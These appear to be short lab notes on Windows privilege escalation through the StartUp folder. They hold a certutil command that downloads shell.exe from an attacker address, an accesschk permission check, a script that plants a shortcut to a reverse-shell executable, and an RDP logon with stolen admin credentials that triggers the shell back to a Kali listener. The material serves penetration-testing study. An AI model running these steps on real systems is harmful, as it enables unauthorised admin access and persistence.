# Windows Privilege Escalation via Startup Folder | Real-World Technique

## 1st Technique

```jsx
certutil -urlcache -split -f http://192.168.189 shell.exe

```

![image.png](Windows%20Privilege%20Escalation%20via%20Startup%20Folder%20Re/image.png)

## 2nd Technique

Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:

`C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`

Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:

`cscript C:\PrivEsc\CreateShortcut.vbs`

Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:

`rdesktop -u admin 10.145.190.8`

A shell running as admin should connect back to your listener.